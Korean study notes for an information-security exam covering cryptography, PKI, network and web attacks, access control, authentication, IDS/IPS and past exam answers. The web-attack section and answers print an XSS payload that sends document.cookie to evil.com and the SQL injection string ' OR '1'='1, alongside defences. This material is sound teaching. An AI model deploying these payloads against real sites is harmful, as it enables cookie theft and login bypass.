대칭키 vs 비대칭키 비교표

구분대칭키비대칭키(공개키)
키 수1개 (동일한 키)2개 (공개키 + 개인키)
속도빠름 (⬡ 하드웨어 구현 용이)느림 (수학적 연산 복잡)
키 배송문제 있음 (안전한 채널 필요)문제 없음 (공개키는 공개)
키 관리n(n-1)/2개 필요 (n명 통신)2n개 필요 (n명 통신)
주요 용도대용량 파일 암호화, 디스크 암호화키 교환, 전자서명, 인증서
대표 알고리즘AES(128/192/256비트), SEED(128비트)RSA(2048비트+), ECC
✅ 실무: 하이브리드 암호화 — 비대칭키로 세션키(대칭키)를 안전하게 교환 → 이후 대칭키로 데이터 암호화 (SSL/TLS 방식)

해시 함수 특성 (3가지 반드시 암기)

특성설명
역상 저항성 (Preimage Resistance)해시값 h로부터 원문 m을 구하는 것이 계산적으로 불가능
제2 역상 저항성 (Second Preimage Resistance)m의 해시값과 동일한 해시값을 가진 m'을 찾는 것이 불가능
충돌 저항성 (Collision Resistance)H(m₁)=H(m₂)인 서로 다른 m₁, m₂를 찾는 것이 불가능
⚠️ MD5, SHA-1은 충돌 취약점 발견 → 보안 용도로 사용 불가. SHA-256 이상 사용 권장.
02 PKI & 전자서명

전자서명 (Digital Signature) 과정

단계송신자 (서명)수신자 (검증)
①원문 m을 해시 → 해시값 h 생성수신한 원문 m'을 해시 → h' 생성
②해시값 h를 개인키로 암호화 → 서명값 s서명값 s를 공개키로 복호화 → h 획득
③원문 m + 서명값 s 전송h == h' 이면 무결성·인증 확인
✅ 암기: 서명 = 개인키로 암호화 / 검증 = 공개키로 복호화 (일반 암호화와 반대!)
서명의 목적: ① 무결성 ② 인증 ③ 부인 방지

PKI (Public Key Infrastructure) 구성요소

구성요소역할
CA (인증기관)공개키 인증서 발급·폐기·관리 (공인인증기관)
RA (등록기관)사용자 신원 확인 후 CA에 인증서 발급 요청 위탁
CRL (인증서 폐기 목록)유효기간 내 폐기된 인증서 목록 (OCSP로 실시간 확인)
디지털 인증서공개키 + 소유자 정보 + CA 서명 묶음 (X.509 형식)
03 네트워크 공격 유형
DoS (서비스 거부 공격)
단일 공격자가 대량 트래픽·요청으로 서버 자원 소진시켜 정상 서비스 불가
✅ 대응: 방화벽, IPS, 대역폭 제한, Rate Limiting
DDoS (분산 서비스 거부)
다수의 좀비PC(봇넷)로 동시 공격. 공격 출처 추적 어려움
✅ 대응: CDN, Anti-DDoS 서비스, 블랙홀 라우팅
스니핑 (Sniffing)
네트워크 패킷을 도청하여 데이터(비밀번호, 세션 등) 탈취. 수동적 공격
✅ 대응: 암호화(TLS/SSH), 스위치 사용, VPN
스푸핑 (Spoofing)
IP·MAC·DNS를 위조하여 신뢰할 수 있는 것처럼 속이는 공격
✅ 대응: 패킷 필터링, 인증 강화, IP 검증
세션 하이재킹
인증된 세션 ID를 탈취하여 정상 사용자 권한으로 접근
✅ 대응: 세션 ID 갱신, HTTPS, HttpOnly 쿠키
버퍼 오버플로우
버퍼 크기 초과 입력으로 인접 메모리 덮어씀 → 임의 코드 실행
✅ 대응: 입력값 검증, ASLR, 스택 가드, 안전한 함수 사용
레인보우 테이블 공격
미리 계산된 해시값 목록으로 비밀번호 역추적 (무차별 대입 최적화)
✅ 대응: 솔트(Salt) 추가, bcrypt·Argon2 사용
중간자 공격 (MITM)
통신 중간에서 도청·변조. ARP 스푸핑으로 시작하는 경우 多
✅ 대응: 인증서 검증(PKI), HSTS, VPN
04 웹 보안 공격 (자주 출제)

SQL Injection — 입력값으로 SQL 조작

-- 취약한 쿼리 (문자열 직접 연결) SELECT * FROM users WHERE id='' AND pw='' -- 공격: id에 ' OR '1'='1 입력 → 항상 참이 됨 SELECT * FROM users WHERE id='' OR '1'='1' AND pw='' -- 대응: Prepared Statement (바인딩 파라미터) SELECT * FROM users WHERE id=? AND pw=?
✅ 대응: ① Prepared Statement (가장 효과적) ② 입력값 이스케이핑 ③ 최소 권한 DB 계정

XSS (Cross-Site Scripting) — 스크립트 삽입

-- 공격자가 게시판에 악성 스크립트 삽입 <script>document.location='http://evil.com?c='+document.cookie</script> -- 다른 사용자가 게시글 열람 시 스크립트 실행 → 쿠키 탈취 -- 대응: 출력 시 HTML 이스케이핑 < → &lt; > → &gt; & → &amp;
유형특징
반사형 (Reflected)URL에 스크립트 포함 → 서버가 그대로 응답에 반사
저장형 (Stored)DB에 스크립트 저장 → 다른 사용자 조회 시 실행 (더 위험)
DOM 기반서버 거치지 않고 클라이언트 DOM 조작
✅ 대응: ① 출력 인코딩 ② CSP(Content Security Policy) ③ HttpOnly 쿠키

CSRF vs XSS 비교

구분XSSCSRF
공격 방향서버 → 피해자 (서버에서 악성 스크립트 전달)피해자 → 서버 (피해자 권한으로 서버에 요청)
목적세션 탈취, 정보 탈취피해자 권한으로 원치 않는 행위 유도
핵심 대응출력 인코딩, CSPCSRF 토큰, SameSite 쿠키, Referer 검증
05 접근 제어 모델
DAC
임의적 접근 제어 (Discretionary)
데이터 소유자가 직접 접근 권한 설정. 자유롭지만 보안 취약.
유연성 高 보안성 低
예: 유닉스 chmod, 윈도우 파일 권한
MAC
강제적 접근 제어 (Mandatory)
시스템·정책이 보안 등급 기반으로 접근 제어. 매우 엄격.
보안성 高 군사·기밀 환경
예: SELinux, 군사 보안 시스템
RBAC
역할 기반 접근 제어 (Role-Based)
사용자 → 역할 → 권한 부여. 관리가 쉽고 현대적.
기업 환경 표준 관리 용이
예: 관리자/직원/게스트 역할 분리
06 인증 (Authentication)
인증 요소유형예시특징
지식 기반
Something you Know		비밀번호, PIN, 보안 질문비밀번호 1234간편, 탈취·망각 위험
소유 기반
Something you Have		OTP, 스마트카드, 보안 토큰OTP 앱, 공인인증서분실 위험, 지식보다 강함
생체 기반
Something you Are		지문, 얼굴, 홍채, 정맥지문인식, FaceID편리, 변경 불가, 오인식률
행동 기반
Something you Do		서명, 키스트로크 패턴, 걸음걸이전자 서명행동 패턴 분석
💡 MFA (Multi-Factor Authentication): 2가지 이상의 인증 요소 조합. 예: 비밀번호(지식) + OTP(소유) → 2FA
인증 vs 인가: 인증(Authentication) = "너 누구야?" / 인가(Authorization) = "너 뭘 할 수 있어?"

08 방화벽 · IDS · IPS
구분역할위치특징
방화벽
(Firewall)		 IP/포트 기반 트래픽 차단·허용 경계(인터넷-내부망) 정책 기반, L3·L4 필터링
IDS
(침입탐지시스템)		 이상 트래픽·침입 탐지만 (알림) 내부망 미러 포트 수동적 모니터링, 차단 불가
IPS
(침입방지시스템)		 탐지 + 자동 차단 인라인(패킷 경유) 능동적 대응, 오탐 시 정상 차단 위험
WAF
(웹 방화벽)		 웹 공격(XSS·SQLi·CSRF) 탐지·차단 웹서버 앞단 L7 필터링, OWASP Top10 대응

09 기출 문제
기출 빈출  대칭키 암호화와 비대칭키 암호화의 차이점을 키 개수, 속도, 용도 측면에서 비교하시오.
▼
정답
대칭키: 동일 키 1개, 빠름, 대용량 암호화
비대칭키: 공개키+개인키 쌍, 느림, 키 교환·서명
대칭키: 암복호화에 동일 키 사용 / AES·SEED·DES / 빠름 / 키 배송 문제 있음
비대칭키: 공개키 암호화 → 개인키 복호화 / RSA·ECC / 느림 / 키 배송 문제 없음

실제로는 하이브리드 방식 사용: 비대칭키로 대칭 세션키 교환 → 대칭키로 데이터 암호화
기출 빈출  전자서명(Digital Signature)에서 서명 생성 시 어떤 키를 사용하고, 검증 시 어떤 키를 사용하는지 쓰시오.
▼
정답
서명: 송신자의 개인키 / 검증: 송신자의 공개키
전자서명 과정:
① 원문 → 해시값 생성
② 해시값을 개인키로 암호화 = 서명
③ 수신측: 서명을 공개키로 복호화 → 해시값 획득
④ 원문 다시 해시 → 두 해시값 비교 → 일치 시 무결성·인증 확인

전자서명 효과: ① 무결성 ② 인증 ③ 부인 방지
기출 빈출  SQL Injection 공격의 원리와 가장 효과적인 대응 방법을 쓰시오.
▼
정답
원리: 입력값에 SQL 코드 삽입 → 쿼리 조작
대응: Prepared Statement (파라미터화 쿼리)
공격 예시: 아이디에 ' OR '1'='1 입력 → WHERE 조건 항상 참이 되어 인증 우회

대응 방법 (순서대로):
① Prepared Statement: 입력값을 SQL과 분리하여 실행 (가장 효과적)
② 입력값 검증·이스케이핑
③ 최소 권한 DB 계정 사용
④ 에러 메시지에 DB 정보 노출 금지
기출 빈출  XSS(Cross-Site Scripting) 공격 원리와 방어 방법을 쓰시오.
▼
정답
원리: 악성 스크립트를 웹 페이지에 삽입 → 다른 사용자 브라우저에서 실행
대응: 출력 시 HTML 특수문자 인코딩
공격 시나리오: 게시판에 <script>document.cookie</script> 삽입 → 피해자 쿠키 탈취

대응 방법:
① 출력 인코딩: <→&lt;, >→&gt; 변환
② CSP(Content Security Policy) 헤더 설정
③ HttpOnly 쿠키 (JS에서 쿠키 접근 불가)
④ 입력값 검증 (화이트리스트 기반)
기출 빈출  접근 제어 모델 DAC, MAC, RBAC을 각각 간략히 설명하시오.
▼
정답
DAC: 소유자가 접근 권한 결정
MAC: 시스템·보안 정책이 접근 제어
RBAC: 역할(Role) 기반으로 권한 부여
DAC (임의적): 데이터 소유자가 권한 설정 → 유연, 보안 약함. 예: 유닉스 chmod
MAC (강제적): 보안 등급(기밀/비밀/일반) 기반, 시스템이 통제 → 군사 환경
RBAC (역할기반): 관리자/직원/게스트 역할에 권한 묶음 → 기업 환경 표준

보안 강도: DAC < RBAC < MAC
기출 유사  해시 함수(Hash Function)의 특성 3가지를 쓰시오.

정답
① 역상 저항성 ② 제2 역상 저항성 ③ 충돌 저항성
① 역상 저항성: 해시값으로부터 원문 역추적 불가 (단방향성)
② 제2 역상 저항성: 같은 해시값을 가진 다른 원문을 찾는 것이 불가
③ 충돌 저항성: 해시값이 같은 서로 다른 두 원문을 찾는 것이 불가

추가 특성: 눈사태 효과 (입력 1비트 변경 → 출력 전체 변화), 고정 출력 길이
MD5·SHA-1은 충돌 취약 발견 → SHA-256 이상 권장

정답
전송 모드: IP 페이로드만 보호, 헤더 그대로
터널 모드: 원본 패킷 전체 암호화 + 새 IP 헤더 추가
전송 모드: 호스트-호스트 간 직접 통신. IP 헤더는 암호화 안 됨.
터널 모드: 게이트웨이-게이트웨이 간. 원본 IP까지 숨김. VPN 구현에 사용됨 (더 많이 쓰임)

IPSec 프로토콜:
• AH: 인증+무결성 (암호화 없음)
• ESP: 인증+무결성+기밀성 (암호화 포함, 더 많이 사용)
개념 확인  IDS와 IPS의 차이점을 설명하고, IDS의 두 가지 탐지 방식을 비교하시오.
▼
정답
IDS: 탐지·알림만 (수동적)
IPS: 탐지 + 자동 차단 (능동적)
IDS vs IPS:
IDS = 침입탐지시스템 → 이상 감지 후 알림만 발송 (미러 포트 위치)
IPS = 침입방지시스템 → 이상 감지 후 즉시 트래픽 차단 (인라인 위치)

IDS 탐지 방식:
① 오용(서명) 탐지: 알려진 공격 패턴 DB와 비교 → 오탐 낮음, 신종 공격 못 잡음
② 이상 탐지: 정상 행동 기준선과 비교 → 신종 공격 탐지 가능, 오탐 높음
